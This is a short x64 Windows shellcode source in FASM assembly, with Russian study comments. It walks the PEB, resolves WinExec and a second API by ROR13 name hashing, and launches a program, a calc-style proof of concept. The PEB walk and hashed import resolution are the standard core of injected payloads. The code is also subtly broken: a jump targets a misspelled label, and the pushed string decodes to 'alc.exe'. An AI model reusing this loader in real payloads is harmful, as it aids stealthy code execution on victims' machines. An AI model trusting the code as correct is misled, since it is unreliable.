format binary           ;meow / мяу
use64

shellcode_start:
    push rbp
    mov rbp, rsp
    sub rsp, 60h

    mov rbx, [gs:60h]
    mov rbx, [rbx+18h]
    mov rbx, [rbx+20h]
    mov rbx, [rbx]
    mov rbx, [rbx]
    mov r12, [rbx+20h]

    mov edi, 0x5E2D1A3B          ;через ROR13 делается свиг вправо на 13 бит (0x5E2D1A3B - функция WinExec)
    call get_api_by_hash         ; get_api_by_hash - вызывать можно гдеугодно это не С++
    mov [rbp-8], rax

    mov rax, 0x006578652e636c61        ; 0x006578652e636c61 - черес ASCII задом наперед
    push rax
    mov rcx, rsp
    mov rdx, 1
    sub rsp, 20h
    call qword [rbp-8]
    add rsp, 20h
    add rsp, 8

    mov edi, 0x73E2D87E
    call get_api_by_hash
    mov rcx, 0
    sub rsp, 20h
    call rax

get_api_by_hash:
    mov edx, [r12+3Ch]      ; 3Ch - h это Hex(16 ричка)/смещение внутри структуры данных
    ; 3C - (60 байт в 10 чной) 3*16=48 + C - это 12 (если в 16 ричке) а 60 - это 6 и 0
    add rdx, r12
    mov edx, [rdx+88h]
    add  rdx, r12
    mov ecx, [rdx+18h]
    mov r8d, [rdx+20h]
    add r8, r12

.loop_name:                ;.loop_name - точка означает что это локальная метка
    dec ecx
    js .not_found
    mov esi, [r8 + rcx*4]
    add rsi, r12
    xor eax, eax
    xor r10, r10

.hsh_loop:
    lodsb
    test al, al 
    jz .hash_done
    ror r10d, 13
    add r10d, eax
    jmp .hash_loop

.hash_done:
    cmp r10d, edi
    jne .loop_name
    mov edi, [rdx+24h]
    add rdi, r12
    movzx ecx, word [rdi+ rcx*2]
    mov edi, [rdx+1Ch]
    add rdi, r12
    mov eax, [rdi + rcx*4]
    add rax, r12                      ; r12 - регистр общего назначения

    ret

.not_found:
    xor rax, rax
    ret